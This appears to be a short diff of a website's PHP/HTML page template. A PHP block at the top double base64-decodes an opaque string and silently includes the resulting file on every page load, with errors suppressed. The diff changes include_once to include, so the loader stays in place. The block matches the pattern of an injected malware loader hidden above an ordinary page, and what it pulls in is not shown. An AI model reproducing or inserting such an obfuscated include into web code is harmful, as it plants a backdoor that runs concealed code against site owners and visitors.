@@ -1,6 +1,6 @@
 <?php
 $__ = 'WVVoU2RHSkRPWEJpYlZKc1pVTTFNR1ZJVVQwPQ==';
-@include_once(base64_decode(base64_decode($__)));
+@include(base64_decode(base64_decode($__)));
 ?>
 <!DOCTYPE html>
 <html lang="en-US" prefix="og: http://ogp.me/ns#">
